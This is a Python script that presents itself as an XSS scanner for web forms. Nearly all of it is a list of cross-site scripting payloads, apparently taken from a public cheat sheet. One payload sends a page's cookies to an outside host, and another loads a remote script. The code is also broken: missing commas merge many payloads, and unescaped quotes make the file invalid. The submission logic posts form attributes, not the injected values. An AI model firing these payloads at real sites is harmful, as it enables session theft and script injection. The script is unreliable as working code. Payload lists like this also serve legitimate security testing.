import requests
from bs4 import BeautifulSoup
import re

def unicorn_crew_scan(url):
    # Send a GET request to the specified URL
    response = requests.get(url)

    # Parse the HTML content of the response
    soup = BeautifulSoup(response.text, 'html.parser')

    # Find all input fields in the HTML form
    form_fields = soup.find_all('input')

    # List to store potential XSS vulnerabilities
    xss_vulnerabilities = []

    # Iterate over each input field and inject a malicious payload
    for field in form_fields:
        # Create a payload by injecting a XSS script
        payloads = [
            "<script>alert('XSS Vulnerability Found!');</script>",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
            "<IMG SRC=j&#X41vascript:alert('XSS')>",
            "<IMG SRC=`javascript:alert('XSS')`>",
            "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
            "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
            "<IMG SRC=JaVaScRiPt:alert('XSS')>",
            "<IMG SRC=javascript:alert('XSS')>",
            "<IMG SRC=\"jav	ascript:alert('XSS');\">",
            "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
            "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
            "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
            "<IMG SRC=\" &#14;  javascript:alert('XSS');\">"
            "<a onafterscriptexecute=alert(1)><script>1</script>"
            "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><a id=x style="position:absolute;" onanimationcancel="print()"></a>"
            "<style>@keyframes x{}</style><a style="animation-name:x" onanimationend="alert(1)"></a>"
            "<style>@keyframes slidein {}</style><a style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></a>"
            "<style>@keyframes x{}</style><a style="animation-name:x" onanimationstart="alert(1)"></a>"
            "<a onbeforescriptexecute=alert(1)><script>1</script>"
            "<a id=x tabindex=1 onfocus=alert(1)></a>"
            "<a id=x tabindex=1 onfocus=alert(1)></a>"
            "<a id=x tabindex=1 onfocusin=alert(1)></a>"
            "<a onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></a>"
            "<style>:target {color: red;}</style><a id=x style="transition:color 10s" ontransitioncancel=print()></a>"
            "<a id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></a>"
            "<style>:target {transform: rotate(180deg);}</style><a id=x style="transition:transform 2s" ontransitionrun=print()></a>"
            "<style>:target {color:red;}</style><a id=x style="transition:color 1s" ontransitionstart=alert(1)></a>"
            "<style>@keyframes x{}</style><a style="animation-name:x" onwebkitanimationend="alert(1)"></a>"
            "<style>@keyframes slidein {}</style><a style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"></a>"
            "<style>@keyframes x{}</style><a style="animation-name:x" onwebkitanimationstart="alert(1)"></a>"
            "<style>:target {color:red;}</style><a id=x style="transition:color 1s" onwebkittransitionend=alert(1)></a>"
            "<a onbeforecopy="alert(1)" contenteditable>test</a>"
            "<a onbeforecut="alert(1)" contenteditable>test</a>"
            "<a contenteditable onbeforeinput=alert(1)>test"
            "<button popovertarget=x>Click me</button><a onbeforetoggle=alert(1) popover id=x>XSS</a>"
            "<a onblur=alert(1) id=x tabindex=1 style=display:block>test</a><input value=clickme>"
            "<a onclick="alert(1)" style=display:block>test</a>"
            "<a oncontextmenu="alert(1)" style=display:block>test</a>"
            "<a oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test"
            "<a oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test"
            "<a ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</a>"
            "<a draggable="true" ondrag="alert(1)" style=display:block>test</a>"
            "<a draggable="true" ondragend="alert(1)" style=display:block>test</a>"
            "<a draggable="true" ondragenter="alert(1)" style=display:block>test</a>"
            "<a draggable="true" ondragleave="alert(1)" style=display:block>test</a>"
            "<div draggable="true" contenteditable>drag me</div><a ondragover=alert(1) contenteditable style=display:block>drop here</a>"
            "<a draggable="true" ondragstart="alert(1)" style=display:block>test</a>"
            "<div draggable="true" contenteditable>drag me</div><a ondrop=alert(1) contenteditable style=display:block>drop here</a>"
            "<a onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</a><input value=clickme>"
            "<a onkeydown="alert(1)" contenteditable style=display:block>test</a>"
            "<a onkeypress="alert(1)" contenteditable style=display:block>test</a>"
            "<a onkeyup="alert(1)" contenteditable style=display:block>test</a>"
            "<a onmousedown="alert(1)" style=display:block>test</a>"
            "<a onmouseenter="alert(1)" style=display:block>test</a>"
            "<a onmouseleave="alert(1)" style=display:block>test</a>"
            "<a onmousemove="alert(1)" style=display:block>test</a>"
            "<a onmouseout="alert(1)" style=display:block>test</a>"
            "<a onmouseover="alert(1)" style=display:block>test</a>"
            "<a onmouseup="alert(1)" style=display:block>test</a>"
            "<a onmousewheel=alert(1) style=display:block>requires scrolling"
            "<a onpaste="alert(1)" contenteditable>test</a>"
            "<a onpointerdown=alert(1) style=display:block>XSS</a>"
            "<a onpointerenter=alert(1) style=display:block>XSS</a>"
            "<a onpointerleave=alert(1) style=display:block>XSS</a>"
            "<a onpointermove=alert(1) style=display:block>XSS</a>"
            "<a onpointerout=alert(1) style=display:block>XSS</a>"
            "<a onpointerover=alert(1) style=display:block>XSS</a>"
            "<a onpointerrawupdate=alert(1) style=display:block>XSS</a>"
            "<a onpointerup=alert(1) style=display:block>XSS</a>"
            "<button popovertarget=x>Click me</button><xss ontoggle=alert(1) popover id=x>XSS</xss>"
            "<noembed><img title="</noembed><img src onerror=alert(1)>"></noembed>"
            "<noscript><img title="</noscript><img src onerror=alert(1)>"></noscript>"
            "<style><img title="</style><img src onerror=alert(1)>"></style>"
            "<script><img title="</script><img src onerror=alert(1)>"></script>"
            "<iframe><img title="</iframe><img src onerror=alert(1)>"></iframe>"
            "<xmp><img title="</xmp><img src onerror=alert(1)>"></xmp>"
            "<textarea><img title="</textarea><img src onerror=alert(1)>"></textarea>"
            "<noframes><img title="</noframes><img src onerror=alert(1)>"></noframes>"
            "<title><img title="</title><img src onerror=alert(1)>"></title>"
            "<input type="file" id="fileInput" /><script>const fileInput = document.getElementById('fileInput');const dataTransfer = new DataTransfer();const file = new File(['Hello world!'], 'hello.txt', {type: 'text/plain'});dataTransfer.items.add(file);fileInput.files = dataTransfer.files</script>"
            "<script>onerror=alert;throw 1</script>"
            "<script>{onerror=alert}throw 1</script>"
            "<script>throw onerror=alert,1</script>"
            "<script>throw onerror=eval,'=alert\x281\x29'</script>"
            "<script>throw onerror=eval,'alert\x281\x29'</script>"
            "<script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}</script>"
            "<script>throw onerror=eval,e=new Error,e.message='alert\x281\x29',e</script>"
            "<script>throw onerror=Uncaught=eval,e=new Error,e.message='/*'+location.hash,!!window.InstallTrigger?e:e.message</script>"
            "<script>throw{},onerror=Uncaught=eval,h=location.hash,e={lineNumber:1,columnNumber:1,fileName:0,message:h[2]+h[1]+h},!!window.InstallTrigger?e:e.message</script>"
            "<script>throw/x/,onerror=Uncaught=eval,h=location.hash,e=Error,e.lineNumber=e.columnNumber=e.fileName=e.message=h[2]+h[1]+h,!!window.InstallTrigger?e:e.message</script>"
            "<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>"
            "<script>'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}</script>"
            "<script>location='javascript:alert\x281\x29'</script>"
            "<script>location=name</script>"
            "<script>alert`1`</script>"
            "<script>new Function`X${document.location.hash.substr`1`}`</script>"
            "<script>Function`X${document.location.hash.substr`1`}```</script>"
            "<video><source onerror=location=/\02.rs/+document.cookie>"
            "<svg onload=alert(1) "
            "<svg onload=alert(1)<!--"
            "<script>throw[onerror]=[alert],1</script>"
            "<script>var{a:onerror}={a:alert};throw 1</script>"
            "<script>var{haha:onerror=alert}=0;throw 1</script>"
            "<script>window.name='javascript:alert(1)';</script><svg onload=location=name>"
            "<xss class=progress-bar-animated onanimationstart=alert(1)>"
            "<xss class="carousel slide" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class="carousel-item active"></xss><xss class=carousel-item></xss></xss></xss>"
            "<iframe src="javascript:alert(1)">"
            "<object data="javascript:alert(1)">"
            "<embed src="javascript:alert(1)">"
            "<a href="javascript:alert(1)">XSS</a>"
            "<a href="JaVaScript:alert(1)">XSS</a>"
            "<a href=" 	javascript:alert(1)">XSS</a>"
            "<a href="javas	cript:alert(1)">XSS</a>"
            "<a href="javascript :alert(1)">XSS</a>"
            "<svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">XSS</text></a>"
            "<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>"
            "<svg><animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /><a id=xss><text x=20 y=20>XSS</text></a>"
            "<svg><set xlink:href=#xss attributeName=href from=? to=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>"
            "<script src="data:text/javascript,alert(1)"></script>"
            "<svg><script href="data:text/javascript,alert(1)" />"
            "<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x"></use></svg>"
            "<script>import('data:text/javascript,alert(1)')</script>"
            "<base href="javascript:/a/-alert(1)///////"><a href=../lol/safari.html>test</a>"
            "<math><x href="javascript:alert(1)">blah"
            "<form><button formaction=javascript:alert(1)>XSS"
            "<form><input type=submit formaction=javascript:alert(1) value=XSS>"
            "<form action=javascript:alert(1)><input type=submit value=XSS>"
            "<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://portswigger.net?&semi;javascript:alert(1)&semi;0" /><a id=xss><text x=20 y=20>XSS</text></a>"
            "<a href="javascript://%0aalert(1)">XSS</a>"
            "<svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==#x" /></svg>"
            "<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />"
            "<svg><animate xlink:href="#x" attributeName="href" values="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" /><use id=x />"
            "<embed code=https://portswigger-labs.net width=500 height=500 type=text/html>"
            "<object width=500 height=500 type=text/html><param name=url value=https://portswigger-labs.net>"
            "<object width=500 height=500 type=text/html><param name=code value=https://portswigger-labs.net>"
            "<object width=500 height=500 type=text/html><param name=movie value=https://portswigger-labs.net>"
            "<object width=500 height=500 type=text/html><param name=src value=https://portswigger-labs.net>"
            "<script>location.protocol='javascript'</script>"
            "<a href="%0aalert(1)" onclick="protocol='javascript'">test</a>"
            "<script>navigation.navigate('javascript:alert(1)')</script>"
            "<iframe srcdoc="<img src=1 onerror=alert(1)>"></iframe>"
            "<iframe srcdoc="&lt;img src=1 onerror=alert(1)&gt;"></iframe>"
            "<form action="javascript:alert(1)"><input type=submit id=x></form><label for=x>XSS</label>"
            "<input type="hidden" accesskey="X" onclick="alert(1)"> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)"
            "<link rel="canonical" accesskey="X" onclick="alert(1)" /> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)"
            "<a href=# download="filename.html">Test</a>"
            "<img referrerpolicy="no-referrer" src="//portswigger-labs.net">"
            "<a href=# onclick="window.open('http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//','alert(1)')">XSS</a>"
            "<iframe name="alert(1)" src="https://portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"></iframe>"
            "<base target="alert(1)"><a href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//">XSS via target in base tag</a>"
            "<a target="alert(1)" href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//">XSS via target in a tag</a>"
            "<img src="validimage.png" width="10" height="10" usemap="#xss"><map name="xss"><area shape="rect" coords="0,0,82,126" target="alert(1)" href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"></map>"
            "<form action="http://subdomain1.portswigger-labs.net/xss/xss.php" target="alert(1)"><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input type="submit" value="XSS via target in a form"></form>"
            "<form><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input type="submit" formaction="http://subdomain1.portswigger-labs.net/xss/xss.php" formtarget="alert(1)" value="XSS via formtarget in input type submit"></form>"
            "<form><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input name=1 type="image" src="validimage.png" formaction="http://subdomain1.portswigger-labs.net/xss/xss.php" formtarget="alert(1)" value="XSS via formtarget in input type image"></form>"
            "<meta http-equiv="refresh" content="0; url=//portswigger-labs.net">"
            "<meta charset="UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-"
            "<meta http-equiv="Content-Type" content="text/html; charset=UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-"
            "+/v8 +ADw-script+AD4-alert(1)+ADw-/script+AD4-"
            "+/v9 +ADw-script+AD4-alert(1)+ADw-/script+AD4-"
            "+/v+ +ADw-script+AD4-alert(1)+ADw-/script+AD4-"
            "+/v/ +ADw-script+AD4-alert(1)+ADw-/script+AD4-"
            "<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">"
            "<iframe sandbox src="//portswigger-labs.net"></iframe>"
            "<meta name="referrer" content="no-referrer">"
            "%C0%BCscript>alert(1)</script> %E0%80%BCscript>alert(1)</script> %F0%80%80%BCscript>alert(1)</script> %F8%80%80%80%BCscript>alert(1)</script> %FC%80%80%80%80%BCscript>alert(1)</script>"
            "<script>\u0061lert(1)</script>"
            "<script>\u{61}lert(1)</script>"
            "<script>\u{0000000061}lert(1)</script>"
            "<script>eval('\x61lert(1)')</script>"
            "<script>eval('\141lert(1)')</script> <script>eval('alert(\061)')</script> <script>eval('alert(\61)')</script>"
            "<a href="&#106;avascript:alert(1)">XSS</a><a href="&#106avascript:alert(1)">XSS</a>"
            "<svg><script>&#97;lert(1)</script></svg> <svg><script>&#x61;lert(1)</script></svg> <svg><script>alert&NewLine;(1)</script></svg> <svg><script>x="&quot;,alert(1)//";</script></svg>"
            "<a href="&#0000106avascript:alert(1)">XSS</a>"
            "<a href="&#x6a;avascript:alert(1)">XSS</a>"
            "<a href="j&#x61vascript:alert(1)">XSS</a> <a href="&#x6a avascript:alert(1)">XSS</a> <a href="&#x6a avascript:alert(1)">XSS</a>"
            "<a href="&#x0000006a;avascript:alert(1)">XSS</a>"
            "<a href="&#X6A;avascript:alert(1)">XSS</a>"
            "<a href="javascript&colon;alert(1)">XSS</a> <a href="java&Tab;script:alert(1)">XSS</a> <a href="java&NewLine;script:alert(1)">XSS</a> <a href="javascript&colon;alert&lpar;1&rpar;">XSS</a>"
            "<a href="javascript:x='%27-alert(1)-%27';">XSS</a>"
            "<a href="javascript:x='&percnt;27-alert(1)-%27';">XSS</a>"
            "<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>"
            "<script src=data:text/javascript;base64,&#x59;&#x57;&#x78;&#x6c;&#x63;&#x6e;&#x51;&#x6f;&#x4d;&#x53;&#x6b;&#x3d;></script>"
            "<script src=data:text/javascript;base64,%59%57%78%6c%63%6e%51%6f%4d%53%6b%3d></script>"
            "<iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe>"
            "<iframe src="javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'"></iframe>"
            "<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>"
            "<img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`>"
            "{{constructor.constructor('alert(1)')()}}"
            "<div v-html="''.constructor.constructor('alert(1)')()">a</div>"
            "<x v-html=_c.constructor('alert(1)')()>"
            "<x v-if=_c.constructor('alert(1)')()>"
            "{{_c.constructor('alert(1)')()}}"
            "{{_v.constructor('alert(1)')()}}"
            "{{_s.constructor('alert(1)')()}}"
            "<p v-show="_c.constructor`alert(1)`()">"
            "<x v-on:click='_b.constructor`alert(1)`()'>click</x>"
            "<x v-bind:a='_b.constructor`alert(1)`()'>"
            "<x @[_b.constructor`alert(1)`()]>"
            "<x :[_b.constructor`alert(1)`()]>"
            "<p v-=_c.constructor`alert(1)`()>"
            "<x #[_c.constructor`alert(1)`()]>"
            "<p :=_c.constructor`alert(1)`()>"
            "{{_c.constructor('alert(1)')()}}"
            "{{_b.constructor`alert(1)`()}}"
            "<x v-bind:is="'script'" src="//14.rs" />"
            "<x is=script src=//⑭.₨>"
            "<x @click='_b.constructor`alert(1)`()'>click</x>"
            "<x @[_b.constructor`alert(1)`()]>"
            "<x :[_b.constructor`alert(1)`()]>"
            "<x #[_c.constructor`alert(1)`()]>"
            "<x title"="&lt;iframe&Tab;onload&Tab;=alert(1)&gt;">"
            "<x title"="&lt;iframe&Tab;onload&Tab;=setTimeout(/alert(1)/.source)&gt;">"
            "<xyz<img/src onerror=alert(1)>>"
            "<svg><svg><b><noscript>&lt;/noscript&gt;&lt;iframe&Tab;onload=setTimeout(/alert(1)/.source)&gt;</noscript></b></svg>"
            "<a @['c\lic\u{6b}']="_c.constructor('alert(1)')()">test</a>"
            "{{$el.ownerDocument.defaultView.alert(1)}}"
            "{{$el.innerHTML='\u003cimg src onerror=alert(1)\u003e'}}"
            "<img src @error=e=$event.path.pop().alert(1)>"
            "<img src @error=e=$event.composedPath().pop().alert(1)>"
            "<img src @error=this.alert(1)>"
            "<svg@load=this.alert(1)>"
            "<p slot-scope="){}}])+this.constructor.constructor('alert(1)')()})};//">"
            "{{_openBlock.constructor('alert(1)')()}}"
            "{{_createBlock.constructor('alert(1)')()}}"
            "{{_toDisplayString.constructor('alert(1)')()}}"
            "{{_createVNode.constructor('alert(1)')()}}"
            "<p v-show=_createBlock.constructor`alert(1)`()>"
            "<x @[_openBlock.constructor`alert(1)`()]>"
            ""
        ]

        # Scripts taken from https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
        
        # Iterate over each payload
        for payload in payloads:
            # Replace the field value with the payload
            field['value'] = payload

            # Submit the modified form
            response = requests.post(url, data=soup.form.attrs)

            # Check if the payload appears in the response
            if re.search(re.escape(payload), response.text, re.IGNORECASE):
                xss_vulnerabilities.append({
                    'field_name': field.get('name'),
                    'payload': payload
                })

    # Print the results
    if xss_vulnerabilities:
        print("Potential XSS vulnerabilities found:")
        for vuln in xss_vulnerabilities:
            print("Field Name:", vuln['field_name'])
            print("Payload:", vuln['payload'])
            print("--------------------")
    else:
        print("No potential XSS vulnerabilities found.")

    print("Execution completed.")

# Example usage
unicorn_crew_scan("url")
